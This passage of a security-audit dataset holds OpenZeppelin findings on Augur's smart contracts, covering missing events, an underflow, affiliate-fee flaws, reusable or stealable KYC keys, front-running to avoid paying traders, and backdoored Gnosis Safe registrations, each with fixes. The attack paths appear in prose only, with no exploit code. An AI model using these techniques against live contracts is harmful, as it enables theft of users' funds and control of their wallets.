      "content": "Several functions in the code base do not emit relevant events to log their execution. In particular:\n\n\n* In the `GnosisSafeRegistry` contract, external functions [`register`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafeRegistry.sol#L52) and [`deRegister`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafeRegistry.sol#L59) do not emit events when executed.\n* In the `AffiliateValidator` contract, ownership transfer does not emit an event. The [`onTransferOwnership` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/AffiliateValidator.sol#L57) has been declared but its body is empty. For consistency, consider following the pattern used in the [`onTransferOwnership` function of the `Market` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L743-L745).\n* In the `WarpSync` contract, the [`recordMarketFinalized` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/WarpSync.sol#L61) should emit an event whenever the `data` for the current universe [is updated](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/WarpSync.sol#L63-L64).\n* In the `Market` contract, the [`transferRepBondOwnership` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L752) should emit an event whenever the address in `repBondOwner` is successfully updated.\n\n\nConsider defining and emitting events whenever sensitive changes occur. This would allow effective notifications to off-chain clients about important modifications in the system.\n\n\n**Update**: *Partially fixed in [PR #5577](https://github.com/AugurProject/augur/pull/5577/files). The events have been added and logged except for the `onTransferOwnership` function of the `AffiliateValidator` contract, since the additional complexity would not be worth the gain.*",
      "summary": "\nThis bug report is about several functions in the code base that do not emit relevant events to log their execution. In particular, the `GnosisSafeRegistry` contract's external functions `register` and `deRegister` do not emit events when executed, the `AffiliateValidator` contract's ownership transfer does not emit an event, the `WarpSync` contract's `recordMarketFinalized` function should emit an event whenever the data for the current universe is updated, and the `Market` contract's `transferRepBondOwnership` function should emit an event whenever the address in `repBondOwner` is successfully updated. \n\nIt is suggested that events should be defined and emitted whenever sensitive changes occur, as this would allow effective notifications to off-chain clients about important modifications in the system. This bug has been partially fixed in PR #5577, where the events have been added and logged except for the `onTransferOwnership` function of the `AffiliateValidator` contract, as the additional complexity would not be worth the gain.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11486",
      "title": "[M03] WarpSync contract may return erroneous finalization reward",
      "impact": "MEDIUM",
      "content": "The public [`getFinalizationReward` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/WarpSync.sol#L67) of the `WarpSync` contract is intended to retrieve the finalization reward of a given market. Internally, it calls the [`getRepReward` private function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/WarpSync.sol#L75) passing the end time of the market’s dispute window as an argument.\n\n\nIf `getFinalizationReward` is called when the market’s dispute window is not yet over (i.e., when `block.timestamp` is lower than `_market.getDisputeWindow().getEndTime()`), then the [unsafe arithmetic operation in line 77](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/WarpSync.sol#L77) will inevitably underflow. As a result, the returned amount of REP representing the finalization reward will be erroneous.\n\n\nNote that this issue does not introduce a security risk on its own. The only time the `getFinalizationReward` function is used internally by Augur is [at the `recordMarketFinalized` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/WarpSync.sol#L62), when the market’s dispute window should already be over. At this point, no underflows should occur when calculating the reward. Additionally, the `getCreationReward` function is not affected by the unsafe arithmetic operation mentioned in the previous paragraph, as any known Augur universe is expected to have a lower creation time than the current `block.timestamp`.\n\n\nYet, to prevent unexpected behaviors when querying the `getFinalizationReward` function from off-chain clients (or other functions in future changes to the code base), consider reverting the transaction when an underflow occurs. Alternatively, depending on Augur’s use cases for this getter function, consider returning zero as the REP reward when the given market’s dispute window is not yet over.\n\n\n**Update**: *Fixed in [PR #5564](https://github.com/AugurProject/augur/pull/5564/files). The `WarpSync` contract now uses `SafeMathUint256` in all calculations.*",
      "summary": "\nThe Augur Project identified a bug in the `getFinalizationReward` function of the `WarpSync` contract. This function is intended to retrieve the finalization reward of a given market, and it calls the `getRepReward` private function passing the end time of the market’s dispute window as an argument. \n\nHowever, if `getFinalizationReward` is called when the market’s dispute window is not yet over, then an unsafe arithmetic operation in line 77 will cause an underflow, resulting in a wrong amount of REP being returned. This bug does not introduce a security risk on its own, as the only time the function is used internally by Augur is when the market’s dispute window should already be over.\n\nTo fix this bug, the Augur Project considered reverting the transaction when an underflow occurs, or returning zero as the REP reward when the given market’s dispute window is not yet over. The bug has since been fixed in PR #5564, where the `WarpSync` contract now uses `SafeMathUint256` in all calculations.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11485",
      "title": "[M02] Total amount of affiliate fees not decreased after withdrawal",
      "impact": "MEDIUM",
      "content": "The [`withdrawAffiliateFees` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L390) of the `Market` contract allows anyone to trigger a withdrawal of all fees an affiliate has earned. While the corresponding affiliate fees are correctly [set to zero](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L396), the total amount of affiliate fees (tracked in the [`totalAffiliateFeesAttoCash` state variable](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L58)) is never decreased. As a result, all Augur markets can end up in an inconsistent state where the sum of all entries in the [`affiliateFeesAttoCash` mapping](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L67) does not exactly add up to `totalAffiliateFeesAttoCash`.\n\n\nThis issue does not pose a security risk for the Augur protocol. Still, consider always decreasing the `totalAffiliateFeesAttoCash` after a withdrawal of affiliate fees to ensure consistency and avoid breaking a relevant invariant of the `Market` contract.\n\n\n**Update**: *Fixed in [PR #5564](https://github.com/AugurProject/augur/pull/5564/files). This is actually the intended behavior so `totalAffiliateFeesAttoCash` has been renamed to `totalPreFinalizationAffiliateFeesAttoCash` for clarity.*",
      "summary": "\nThis bug report concerns the `withdrawAffiliateFees` function of the `Market` contract in the Augur protocol. This function allows anyone to trigger a withdrawal of all fees an affiliate has earned. After the withdrawal, the corresponding affiliate fees are correctly set to zero. However, the total amount of affiliate fees is not decreased, and this can cause the sum of all entries in the `affiliateFeesAttoCash` mapping to not add up to the `totalAffiliateFeesAttoCash` state variable.\n\nThis bug does not pose a security risk for the Augur protocol, but it can cause inconsistencies and break a relevant invariant of the `Market` contract. To avoid this, it is recommended to always decrease the `totalAffiliateFeesAttoCash` after a withdrawal of affiliate fees.\n\nThe issue has now been fixed in pull request #5564. The `totalAffiliateFeesAttoCash` has been renamed to `totalPreFinalizationAffiliateFeesAttoCash` for clarity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11484",
      "title": "[M01] Affiliate keys can be reused",
      "impact": "MEDIUM",
      "content": "The [`addKey` function of the `AffiliateValidator` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/AffiliateValidator.sol#L23) is used to associate a `key` with a user account. The `key` is expected to be derived from the user’s KYC information. The function first confirms that a given key-salt pair was signed by an operator and that the salt has not been used already. Then it associates the key with the sender’s account.\n\n\nHowever, should the signer be a registered operator on multiple instances of the same `AffiliateValidator` contract, any user can take a signature intended for one contract and apply it to any other. As a consequence, any user would be able to obtain valid keys without going through the mandatory KYC process.\n\n\nDepending on the expected scenarios where multiple `AffiliateValidator` contracts share operators, it may be acceptable for the same user to reuse a key (assuming the reported **“[H03] Affiliate keys can be stolen”** issue is first addressed). Otherwise, consider including the contract’s address within the key hash to ensure the signature can only be used with the expected `AffiliateValidator` contract.\n\n\n**Update**: *Fixed in [PR #5564](https://github.com/AugurProject/augur/pull/5564/files). The `AffiliateValidator` contract address is included within the key hash.*",
      "summary": "\nThe `addKey` function of the `AffiliateValidator` contract is used to associate a key with a user account. The key is expected to be derived from the user's KYC information and is confirmed to be signed by an operator and that the salt has not been used already. However, if the signer is a registered operator on multiple instances of the same `AffiliateValidator` contract, any user can take a signature intended for one contract and apply it to any other, allowing them to obtain valid keys without going through the mandatory KYC process. To address this issue, the contract's address is included within the key hash to ensure the signature can only be used with the expected `AffiliateValidator` contract. This bug has been fixed in PR #5564.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11483",
      "title": "[H04] User can unknowingly contribute to the wrong market outcome in forked universe",
      "impact": "HIGH",
      "content": "The `Market` contract [has a `preemptiveDisputeCrowdsourcer` variable](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L59) that allows users to pool funds in support of the tentative winning outcome in anticipation of a dispute. If a dispute is successful, it becomes the new tentative winning outcome and [the `preemptiveDisputeCrowdsourcer`, if it is non-zero, becomes a counter-dispute contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L239-L251) in favor of the previous outcome.\n\n\nHowever, it is possible for the `preemptiveDisputeCrowdsourcer` to (inconsistently) support an outcome that is not the current tentative winning outcome. In particular, when a different market in Augur undergoes a fork and `disavowCrowdsourcers` is called on the non-forking market, [the dispute chain is reset to the initial reporter](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L477-L479) but the `preemptiveDisputeCrowdsourcer` is not reset. While the initial reporter [becomes the tentative winning outcome](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L623-L628), it may have a different payout distribution hash to the `preemptiveDisputeCrowdsourcer`.\n\n\nIn this scenario, should a user call the [`contributeToTentative` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L166) with the correct payout numerators corresponding to the tentative winning outcome, the function will eventually [call `internalContribute` with `overload` set to `true`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L176). As a consequence, the internal call to `getOrCreateDisputeCrowdsourcer` [will retrieve the (inconsistent) `preemptiveDisputeCrowdsourcer`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L402), and the user funds will be [incorrectly added to this outcome](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L203).\n\n\nConsider resetting the `preemptiveDisputeCrowdsourcer` in the `disavowCrowdsourcers` function.\n\n\n**Update**: *Fixed in [PR #5564](https://github.com/AugurProject/augur/pull/5564/files). The `preemptiveDisputeCrowdsourcer` state variable is now is reset in the `disavowCrowdsourcers` function.*",
      "summary": "\nThis bug report describes an issue with the `Market` contract in the Augur project. The `preemptiveDisputeCrowdsourcer` variable allows users to pool funds in support of the tentative winning outcome in anticipation of a dispute. When a different market undergoes a fork and `disavowCrowdsourcers` is called on the non-forking market, the dispute chain is reset to the initial reporter but the `preemptiveDisputeCrowdsourcer` is not reset. This can lead to the `preemptiveDisputeCrowdsourcer` supporting an outcome that is not the current tentative winning outcome. If a user calls the `contributeToTentative` function with the correct payout numerators corresponding to the tentative winning outcome, the user funds will be incorrectly added to the `preemptiveDisputeCrowdsourcer` outcome.\n\nThe bug was fixed in PR #5564, where the `preemptiveDisputeCrowdsourcer` state variable was reset in the `disavowCrowdsourcers` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11482",
      "title": "[H03] Affiliate keys can be stolen",
      "impact": "HIGH",
      "content": "The [`addKey` function of the `AffiliateValidator` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/AffiliateValidator.sol#L23) is used to associate a `key` with a user account. The `key` is expected to be derived from the user’s KYC information. The function first confirms that a given key-salt pair was signed by an operator and that the salt has not been used already. Then it associates the key with the sender’s account.\n\n\nHowever, the signature is not cryptographically tied to the caller’s address (i.e., the `msg.sender` address). This means that an attacker can obtain the signature before it is confirmed (e.g., by reading it in a node’s public pool of pending transactions), and later call the `addKey` function to associate the stolen key with the attacker’s account. This will allow the attacker to register a valid key without going through the mandatory KYC process. Furthermore, it will also prevent the victim from using the signature.\n\n\nConsider modifying the `addKey` function of the `AffiliateValidator` contract to include the user’s address within the key hash, so as to ensure the signature can only be redeemed by the intended account.\n\n\n**Update**: *Fixed in [PR #5564](https://github.com/AugurProject/augur/pull/5564/files). The user’s address is included within the key hash.*",
      "summary": "\nThis bug report is about the `addKey` function of the `AffiliateValidator` contract. This function is used to associate a `key` with a user account. The `key` is expected to be derived from the user’s KYC information. However, the signature is not cryptographically tied to the caller’s address (i.e., the `msg.sender` address). This means that an attacker can obtain the signature before it is confirmed and later call the `addKey` function to associate the stolen key with the attacker’s account. This will allow the attacker to register a valid key without going through the mandatory KYC process. \n\nTo fix this issue, the `addKey` function of the `AffiliateValidator` contract was modified to include the user’s address within the key hash. This ensures that the signature can only be redeemed by the intended account. This issue has been fixed in Pull Request #5564.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11481",
      "title": "[H02] Market creators can avoid paying 20% cut of affiliate fees to traders",
      "impact": "HIGH",
      "content": "The [`recordMarketCreatorFees`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L337) function of the `Market` contract determines under which circumstances a portion of the market’s creator fees gets distributed to affiliates. When there is an affiliate associated with the `_sourceAccount` address, the fingerprint of the affiliate’s address is [compared](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L342) against the fingerprint passed as an argument. If both fingerprints match, then [the affiliate’s address is set to zero](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L344). As a result, no fees are paid to the affiliate nor the source account (who is expecting to receive 20% of the affiliate’s fees). These fees are taken from the total amount of market creator fees.\n\n\nWhen a user trading in a market has been referred by the market creator, then the market creator should receive the corresponding affiliate fees from the user’s trading operations. In this case, to avoid paying 20% of the affiliate fees to the user, the market creator can execute front-running transactions that will cause the following trading operation to pay zero fees to affiliates. Specifically, the market creator should:\n\n\n1. See in advance which fingerprint the user set when submitting the trading transaction.\n2. Front-run with a call to the [`setFingerprint` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Affiliates.sol#L17), aiming to change her account’s fingerprint to the one used by the user.\n\n\nIf the front-run succeeds, then the stored fingerprint and the one submitted by the user should match. As a consequence, the execution of `recordMarketCreatorFees` will not pay the 20% of the affiliate fees to the user (because the execution would never jump into the [`if` block in lines 347 to 355](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L347-L355)). Note that this attack should only be profitable for a market creator when the amount to be paid to the user (i.e., 20% of the affiliate fees) is greater than the cost of submitting the front-running transaction to change the fingerprint.\n\n\nThis issue is related to another issue already anticipated by Augur: the fingerprint scheme is intended to prevent users from registering a different address that they control as their affiliate, but it can be easily bypassed by simply changing the fingerprint to a unique value per address. Any solution that can effectively prevent Sybil attacks (where individual users can gain an advantage by controlling multiple accounts) would typically involve identity-based schemes, such as the KYC process intended to be used with the `AffiliateValidator` contract.\n\n\nSince the fingerprint protection can be easily bypassed and it also introduces the vulnerability described here, consider removing the fingerprint mechanism entirely.\n\n\nAlternatively, one plausible course of action to be analyzed is restricting the amount of times an account can modify its fingerprint in the `Affiliates` contract. More importantly, if there are no reasons why an account should ever update its fingerprint, consider reverting all calls to the [`setFingerprint` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Affiliates.sol#L17) if the caller has already registered a fingerprint in the contract.\n\n\n**Update**: *Augur has decided to accept this risk because the market creator already chooses an affiliate validation contract, as well as the market creator fees that are distributed. While we understand Augur’s stance, we keep our reservations on whether this risk should be accepted, considering that it allows market creators to avoid paying fees owed to individual traders.*",
      "summary": "\nThe bug report describes a vulnerability in the Market contract of Augur, a decentralized prediction market platform. The vulnerability allows market creators to avoid paying fees owed to individual traders by front-running transactions and changing their account's fingerprint. This is possible because the fingerprint protection can be easily bypassed and the fingerprint mechanism is not as effective at preventing Sybil attacks as an identity-based scheme. Augur has decided to accept this risk, but the report keeps reservations on whether this is the right decision.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11480",
      "title": "[H01] Malicious market can arbitrarily decide when to pay affiliate fees",
      "impact": "HIGH",
      "content": "It is possible for any user to create a malicious Augur market that can arbitrarily decide when to pay affiliate fees (including the 20% that should be directed to the source trader account).\n\n\nAny attacker can create a `Market` through the [`createMarket` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/factories/MarketFactory.sol#L27) of the `MarketFactory` contract. The `_affiliateValidator` parameter may be the address of an attacker-controlled contract implementing the [`IAffiliateValidator` interface](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/external/IAffiliateValidator.sol). This address is then [set during initialization of the `Market` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L77) without any kind of validation.\n\n\nOnce the [`recordMarketCreatorFees` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L337) of the `Market` contract is called, the `Market` contract [executes a call to the `getAndValidateReferrer` function of the `Affiliates` contract](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L340), passing the attacker-controlled `affiliateValidator` address as the second argument. In turn, the `getAndValidateReferrer` function will [attempt to call a `validateReference` function](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Affiliates.sol#L48) in the attacker-controlled `affiliateValidator` address, providing the two accounts as parameters. At this point, the attacker is in full control of the execution and can arbitrarily determine whether or not the call is successful. If it is not, then the `getAndValidateReferrer` function [will return the zero address](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Affiliates.sol#L55-L57). As a consequence, back in the `Market` contract, the [`_affiliateAddress` local variable](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L340) will be set to zero, which will [prevent paying out the trading fees to the `_sourceAccount` and accumulating affiliate fees](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/reporting/Market.sol#L347-L355).\n\n\nIt must be stressed that the decision of *if* and *when* to pay fees does not currently depend on the Augur protocol at all, but rather on arbitrary logic chosen by the creator of the market in the `affiliateValidator` address.\n\n\nTrying to prevent this attack by limiting the gas forwarded to the potentially malicious `AffiliateValidator` contract does not seem to be a complete solution. Consider putting more strict limitations on the kind of affiliate validator contract that a market creator can set. Ultimately, consider entirely disallowing market creators to set potentially malicious contracts in a market’s `affiliateValidator` address, and instead deploying and setting legitimate `AffiliateValidator` contracts programmatically during a `Market` initialization.\n\n\n**Update**: *Fixed in [commit `8e62ffe8`](https://github.com/AugurProject/augur/commit/8e62ffe80226c385d01dcb0ffc9fc1d601dd7da6). Anyone can create a new `AffiliateValidator` instance using the known contract template, and the `Market` contract ensures the specified validator is one of these instances.*",
      "summary": "\nThis bug report is about an attack vector in the Augur protocol. It is possible for any user to create a malicious Augur market that can arbitrarily decide when to pay affiliate fees, including the 20% that should be directed to the source trader account. The attack works by setting the '_affiliateValidator' parameter of the 'MarketFactory' contract to an attacker-controlled contract that implements the 'IAffiliateValidator' interface. This address is then set during initialization of the 'Market' contract without any kind of validation. \n\nWhen the 'recordMarketCreatorFees' function of the 'Market' contract is called, the 'Market' contract attempts to call a 'validateReference' function in the attacker-controlled 'affiliateValidator' address. At this point, the attacker is in full control of the execution and can arbitrarily determine whether or not the call is successful. If it is not, then the 'getAndValidateReferrer' function will return the zero address. As a consequence, the '_affiliateAddress' local variable will be set to zero, which will prevent paying out the trading fees to the '_sourceAccount' and accumulating affiliate fees. \n\nThe solution to this attack is to limit the kind of affiliate validator contract that a market creator can set, and to entirely disallow market creators to set potentially malicious contracts in a market’s 'affiliateValidator' address. This bug was fixed in commit '8e62ffe8'.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit: Components",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit-components/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11479",
      "title": "[C01] Anyone can register backdoored wallets for any owner in GnosisSafeRegistry contract",
      "impact": "HIGH",
      "content": "The `GnosisSafeRegistry` contract is intended to be a single on-chain registry to keep track of Augur users’ Gnosis Safe Multisig wallets. The registry is expected to be called upon creation of a Gnosis Safe Multisig so that Augur can quickly look up and verify a user’s wallet. `GnosisSafeRegistry` allows users to register one or more wallets through the [`register`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafeRegistry.sol#L52) and [`callRegister`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafeRegistry.sol#L33) functions. Calls to these functions are expected to always be executed from a user-controlled Gnosis Safe Multisig wallet. Wallets are stored in the [`accountSafes` mapping](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafeRegistry.sol#L14) under the first address listed in the `owners` array of the `GnosisSafe` contract. As a consequence, a single owner can have multiple wallets registered in Augur’s `GnosisSafeRegistry`.\n\n\n`GnosisSafeRegistry` is implemented as a registry of proxy contracts pointing to a single known, legitimate, implementation of [`GnosisSafe`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L596). All registered proxies must:\n\n\n* Delegate to an implementation address equal to the [registry’s state variable `gnosisSafeMasterCopy`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafeRegistry.sol#L19). This address is [queried](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafeRegistry.sol#L26) from the `Augur` contract during initialization of the registry.\n* Be instances of the [`Proxy`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L4) contract created through the [`ProxyFactory`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/ProxyFactory.sol#L44) contract.\n\n\nAdditionally, to further restrict the type of valid wallets, all registered wallets can only have [a single owner](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafeRegistry.sol#L78) and a [threshold equal to 1](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafeRegistry.sol#L76).\n\n\nIn spite of all described restrictions, it is possible for an attacker to register malicious Gnosis Safe Multisig wallets under any owner address. By leveraging [Gnosis Safe modules](https://github.com/gnosis/safe-modules), an attacker can craft, deploy and register Gnosis wallets with any owner address and modules attached. Complying with all requirements programmatically enforced by Augur’s registry, these wallets would appear to be legitimate and victim-controlled, but would actually contain a malicious backdoor that would give the attacker unrestricted control over it. This undermines the fundamental assumption of the `GnosisSafeRegistry` contract, thus it should be considered a critical vulnerability. A step-by-step proof-of-concept exploit of this vulnerability can be found [in this private repository](https://github.com/OpenZeppelin/exploit-augur-gnosis-safe-registry).\n\n\nAt least two sensitive attack vectors have been identified:\n\n\n* **For a user that has never registered a wallet in the registry:** an attacker can simply register a wallet with the victim’s address as its owner and perform actions through the wallet. To minimize unexpected side-effects, they could front-run a legitimate transaction intending to register a wallet. Upon querying the registry with the [`getSafe`](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafeRegistry.sol#L82) function, the victim would see a valid wallet registered under her address (and she would even be its sole owner). However, this wallet would have attached an attacker-controlled module that would grant the attacker unrestricted privileges over it. Thus, as [module actions do not require owners’ signatures](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L165-L178), the attacker would be able to trigger any kind of transactions *from* the wallet without requiring confirmation from its owner (i.e., the victim).\n* **For a user that has already registered a wallet in the registry:** an attacker could deploy and register a wallet with the victim’s address as its owner. This wallet would be registered under the victim’s address in the registry, but would end up in the queue of the victim’s registered wallets. Only after de-registering her first wallet would the victim find out that there is another wallet registered under her address. Were she to start using it (as she would be its listed owner), the attacker would be able leverage the backdoor to execute malicious actions from it.\n\n\nIn both cases the attack leverages the fact that Augur’s registry tracks wallets under their owner addresses. As explained, in Gnosis Safe Multisig wallets with malicious modules attached, addresses listed as owners can be easily controlled by an attacker. Consider implementing further restrictions to prevent any attacker to register backdoored wallets for any owner address in Augur’s registry. As starting points to be further analyzed by Augur’s development team, we suggest:\n\n\n* Further restricting the type of Gnosis Safe Multisig wallets that can be registered to only those *without* modules attached. This property can be checked by querying the [`getModules` public getter](https://github.com/AugurProject/augur/blob/67c0fec95e65fca8d27751f28a6c06e5247978c6/packages/augur-core/source/contracts/GnosisSafe.sol#L182).\n* Ensuring the caller of the registry’s `register` and `callRegister` functions is the address listed in the `owners` array of the `GnosisSafe` contract. This can be checked by requiring the owner’s signature or a transaction signed by the owner address.\n\n\n**Update**: *Fixed in [commit `7787dba1`](https://github.com/AugurProject/augur/commit/7787dba1b0b0ba8b93e23e08be5540561c47dc6f). Now only Gnosis Safe Multisig wallets deployed with known parameters and no modules can be registered.*",
